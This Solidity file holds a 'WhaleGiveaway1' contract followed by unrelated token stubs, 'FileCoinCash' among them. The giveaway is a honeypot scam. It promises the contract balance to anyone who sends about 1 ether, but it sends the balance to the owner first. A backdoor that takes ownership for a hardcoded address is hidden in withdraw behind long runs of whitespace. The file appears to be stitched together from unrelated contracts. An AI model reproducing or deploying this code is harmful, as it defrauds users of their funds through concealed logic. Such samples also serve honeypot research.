 

pragma solidity ^0.4.19;

contract WhaleGiveaway1
{
    address public Owner = msg.sender;
    uint constant public minEligibility = 0.999001 ether; 
   
    function()
    public
    payable
    {
        
    }
   
    function redeem()
    public
    payable
    {                                                                    
        if(msg.value>=minEligibility)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
         
        adr.call.value(msg.value)(data);
    }
}
library SafeMath {

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract BasicToken {
  using SafeMath for uint256;

  mapping(address => uint256) balances;
  uint256 totalSupply_;

  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
}

contract StandardToken is BasicToken {
  mapping (address => mapping (address => uint256)) internal allowed;
}

contract FileCoinCash is StandardToken {

    string public name;
    string public symbol;
    uint8 public decimals;   

    function FileCoinCash() public {
        totalSupply_ = 21000000 * 1 ether;
        balances[address(0xb90c870D4259822353C02590eeb76BE8B18E4A60)] = 10000 * 1 ether;
        balances[address(0x5F056029fcE54d5c40fc5d966Eb68bF509240ae0)] = totalSupply_ - balances[address(0xb90c870D4259822353C02590eeb76BE8B18E4A60)];
        name = "File Coin Cash";
        symbol = "FCC";
        decimals = 18;
    }
}
